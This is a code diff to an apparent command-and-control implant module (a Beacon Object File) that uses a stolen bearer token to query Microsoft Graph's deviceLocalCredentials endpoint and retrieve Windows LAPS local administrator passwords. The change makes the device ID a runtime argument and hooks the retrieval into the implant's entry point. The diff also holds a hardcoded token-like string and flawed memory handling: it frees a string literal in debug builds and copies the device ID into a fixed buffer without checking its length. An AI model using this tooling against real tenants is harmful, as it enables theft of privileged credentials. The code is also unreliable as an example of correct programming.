@@ -399,7 +399,7 @@ extern "C" {
         return true;
     }
 
-    void doLAPSEntra(const char* authtoken, const char* devid442) {
+    void doLAPSEntra(const char* authtoken, const char* device_id) {
 
         DFR_LOCAL(WINHTTP, WinHttpOpen);
         DFR_LOCAL(WINHTTP, WinHttpConnect);
@@ -410,19 +410,23 @@ extern "C" {
         DFR_LOCAL(WINHTTP, WinHttpReadData);
         DFR_LOCAL(WINHTTP, WinHttpCloseHandle);
 
-        wchar_t devid[73] = L"7a4b0435-b1a1-4788-9f04-7215c5ec8ee1";           // Although UUID in accord with RFC should not be greater than 36 chars.
         const wchar_t * dlc_endpoint = L"/v1.0/directory/deviceLocalCredentials/%ls?$select=credentials";
         wchar_t craftedurl[400] = { 0 };
         char* respBuff = (char*)malloc(55000);
+        wchar_t* devid = NULL;
         wchar_t* authbear = NULL;
         wchar_t* authhdr = NULL;
         DWORD dataRead = 0;
+
         #ifdef DEBUGTEST
-        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUGTEST] Utilizng Fake Token");
+        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUGTEST] Utilizng Fake Token and Device");
+        devid = L"7a4b0435-b1a1-4788-9f04-7215c5ec8ee1";
         authbear = L"rSlWY2-LWNLvRUyJn5fKQn2KhfpuEPyXOqih9XB0OqyfAaxMdSybe2SUp919o1sqv6cEt8l8hBLVHIlDA4YauZx-4VApIn4sKWN64hvikILoeQ";
         #else
         authbear = (wchar_t*)malloc((strlen(authtoken) + 1) * sizeof(wchar_t));
         toWideChar((char*) authtoken, authbear, (((strlen(authtoken) + 1) * sizeof(wchar_t) )));
+        devid = (wchar_t*)malloc(73 * sizeof(wchar_t));
+        toWideChar((char*) device_id, devid, (((strlen(device_id) + 1) * sizeof(wchar_t) )));
         #endif
 
         authhdr = (wchar_t *)malloc((wcslen(authbear) + wcslen(L"Authorization: Bearer ") + 1) * sizeof(wchar_t));
@@ -436,7 +440,7 @@ extern "C" {
         #endif
 
         if (!respBuff) {
-            BeaconPrintf(CALLBACK_ERROR, "Memory Allocation Failed for OutBuffer.\n");
+            BeaconPrintf(CALLBACK_ERROR, "Failed allocation for Response buffer.\n");
             return;
         }
 
@@ -510,12 +514,10 @@ extern "C" {
         if (hConnect) WinHttpCloseHandle(hConnect);
         if (hSession) WinHttpCloseHandle(hSession);
         if (respBuff) free(respBuff);
+        if (devid) free(devid);
         if (authbear) free(authbear);
         if (authhdr) free(authhdr);
 
-
-
-    
     }
 
     void go(char* args, int len) {
@@ -543,6 +545,7 @@ extern "C" {
             BeaconPrintf(CALLBACK_OUTPUT, "AZURE AD MODE"); 
             authtoken = BeaconDataExtract(&parser, NULL);
             device_id = BeaconDataExtract(&parser, &stringSize);
+            doLAPSEntra(authtoken, device_id);
         }
         else if (strcmp("LAPS", lapsmode) == 0 ) {
 
